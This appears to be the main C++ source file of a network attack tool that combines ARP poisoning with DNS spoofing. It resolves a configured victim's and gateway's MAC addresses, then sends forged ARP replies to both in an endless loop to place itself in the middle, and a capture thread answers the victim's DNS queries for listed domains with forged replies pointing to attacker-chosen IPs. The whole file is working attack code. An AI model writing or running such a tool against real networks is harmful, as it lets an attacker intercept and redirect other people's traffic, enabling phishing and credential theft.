#include "main.h"

#include <iostream>
#include <unordered_map>
#include <vector>

#include <stdio.h>
#include <unistd.h>

#include "Config.h"
#include "dns.h"

#include <fstream>
#include <sstream>

/*
 * Entry point of the application.
 *
 * Params:
 *      int argc: The number of command line arguments.
 *
 *      const char *argv[]: The command line arguments.
 */
int main(int argc, const char *argv[]) {
    // Read strings from config file
    std::unordered_map<std::string, std::string> properties = getConfig("poisoner.conf");
    std::unordered_map<std::string, std::string> domainsToPoison =
        getConfig("spoofed_domains.conf");

    std::unordered_map<std::string, std::string> rawDomainIpPairs =
        getConfig("spoofed_domains.conf");
    for (auto kvp : rawDomainIpPairs) {
        std::cout << kvp.first << " " << kvp.second << std::endl;
    }

    // parse the poison targets
    struct DnsSniffArgs dnsSniffArgs;
    dnsSniffArgs.targets = convertToVector(rawDomainIpPairs);

    struct in_addr victimIp;
    struct in_addr gatewayIp;
    unsigned char *victimIpChar = (unsigned char *)&victimIp;
    unsigned char *gatewayIpChar = (unsigned char *)&gatewayIp;
    const char *tmp;

    tmp = properties["victimIp"].c_str();
    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &victimIpChar[0], &victimIpChar[1], &victimIpChar[2],
               &victimIpChar[3]) != 4) {
        std::cerr << "could not parse victimIp" << std::endl;
        return 0;
    }

    tmp = properties["gatewayIp"].c_str();
    if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &gatewayIpChar[0], &gatewayIpChar[1], &gatewayIpChar[2],
               &gatewayIpChar[3]) != 4) {
        std::cerr << "could not parse gatewayIp" << std::endl;
        return 0;
    }

    // get the mac addresses using arp
    bool victimMacSet = false;
    bool gatewayMacSet = false;
    unsigned char victimMac[ETH_ALEN];
    unsigned char gatewayMac[ETH_ALEN];
    NetworkEngine ipEngine(properties["interfaceName"].c_str());

    // start arp sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            struct arp_header *arp = (struct arp_header *)(packet + 14);

            if (ntohs(arp->arp_hd) == ARPHRD_ETHER && ntohs(arp->arp_pr) == ETH_P_IP) {
                struct in_addr *tmp = (struct in_addr *)arp->arp_spa;
                if (tmp->s_addr == victimIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        victimMac[i] = arp->arp_sha[i];
                    }
                    victimMacSet = true;
                    std::cout << "victim mac acquired" << std::endl;
                }

                if (tmp->s_addr == gatewayIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        gatewayMac[i] = arp->arp_sha[i];
                    }
                    gatewayMacSet = true;
                    std::cout << "gateway mac acquired" << std::endl;
                }
            }
        });
    std::cout << "starting arp sniff" << std::endl;
    ipEngine.startSniff("arp");
    std::cout << "arp sniff started" << std::endl;

    struct arp_header arpRequestVictim;
    struct arp_header arpRequestGateway;
    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestVictim);
    craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestGateway);

    // stop sniffing for macs once they have been found
    while (true) {
        if (!victimMacSet) {
            // send arp request to get mac address of victim
            std::cout << "requesting victim mac" << std::endl;
            ipEngine.sendArp(arpRequestVictim);
        }

        if (!gatewayMacSet) {
            // send arp request to get the mac address of gateway
            std::cout << "requesting gateway mac" << std::endl;
            ipEngine.sendArp(arpRequestGateway);
        }

        if (victimMacSet && gatewayMacSet) {
            std::cout << "stopping arp sniff" << std::endl;
            ipEngine.stopSniff();
            std::cout << "arp sniff has stopped" << std::endl;
            break;
        }

        sleep(2);
    }

    // start dns sniffing
    std::cout << "starting dns sniff" << std::endl;

    dnsSniffArgs.net = &ipEngine;
    dnsSniffArgs.victimIp = &victimIp;
    dnsSniffArgs.gatewayIP = &gatewayIp;
    dnsSniffArgs.targets = convertToVector(domainsToPoison);
    std::thread dnsThread(dnsSpoof, &dnsSniffArgs);

    std::cout << "dns sniffing started" << std::endl;

    // start arp poisoning
    struct arp_header victimArp;
    struct arp_header gatewayArp;
    forgeArp(ipEngine.getMac(), &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(ipEngine.getMac(), &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    // infinite arp loop
    while (true) {
        ipEngine.sendArp(victimArp);
        ipEngine.sendArp(gatewayArp);
        sleep(5);
    }

    dnsThread.join();
    return 0;
}

/*
 * Starts DNS spoofing using pcap_loop.
 *
 * Params:
 *      struct DnsSniffArgs args: A structure containing parameters used by the DNS callback
 *      function.
 */
void dnsSpoof(struct DnsSniffArgs *args) {
    int i;

    pcap_t *session;
    pcap_if_t *allDevs;
    pcap_if_t *temp;

    struct bpf_program filterProgram;
    bpf_u_int32 netAddr = 0;

    char errBuff[PCAP_ERRBUF_SIZE];

    if (pcap_findalldevs(&allDevs, errBuff) == -1) {
        std::cerr << "pcap_findallDevs: " << errBuff << std::endl;
        return;
    }

    for (i = 0, temp = allDevs; temp; temp = temp->next, ++i) {
        if (!(temp->flags & PCAP_IF_LOOPBACK)) {
            break;
        }
    }

    session = pcap_open_live(temp->name, BUFSIZ, 0, 1, errBuff);
    if (!session) {
        std::cerr << "Could not open device: " << errBuff << std::endl;
        return;
    }

    if (pcap_compile(session, &filterProgram, "udp and dst port domain", 0, netAddr)) {
        std::cerr << "Error calling pcap_compile" << std::endl;
        return;
    }

    if (pcap_setfilter(session, &filterProgram) == -1) {
        std::cerr << "Error setting filter" << std::endl;
        return;
    }

    args->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    pcap_loop(session, 0, &dnsGotPacket, (unsigned char *)args);
    close(args->rawSocket);

    pcap_freealldevs(allDevs);
}

/*
 * The callback function that gets called when a DNS packet is captured with pcap_loop.
 *
 * Params:
 *      unsigned char *args: The user supplied arguments.
 *
 *      const struct pcap_pkthdr *header: A header containing meta data about the packet.
 *
 *      const unsigned char *packet: The sniffed packet.
 */
void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                  const unsigned char *packet) {
    struct DnsSniffArgs *params = (struct DnsSniffArgs *)args;
    std::vector<struct DomainIpPair> pairs = params->targets;
    // this is the domain ip pair struct

    struct iphdr *ip;
    struct udphdr *udp;
    dnshdr *dns;

    // get headers
    ip = (iphdr *)(packet + 14);
    udp = (udphdr *)(packet + 14 + 20);
    dns = (dnshdr *)(packet + 14 + 20 + 8);

    unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = udp->dest;
    sin.sin_addr.s_addr = ip->saddr;

    // find the first element that matches
    int i;
    for (i = 0; i < pairs.size(); i++) {
        if (isSameQuestion(pairs[i].name, query)) {
            break;
        }
    }

    // if this is a dns query from the victim and the query is for a domain we are poisoning
    if (dns->qr == DNS_QUERY && ip->saddr == params->victimIp->s_addr && i != pairs.size()) {
        // poison it
        int responseSize = forgeDns(dns, &pairs[i].ip, params->buffer + 20 + 8);
        fillIpUdpHeader(params->buffer, ip->daddr, ip->saddr, udp->dest, udp->source, responseSize);
        sendto(params->rawSocket, params->buffer, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin,
               sizeof(sin));
        std::cout << "poisoning response" << std::endl;
    }
}
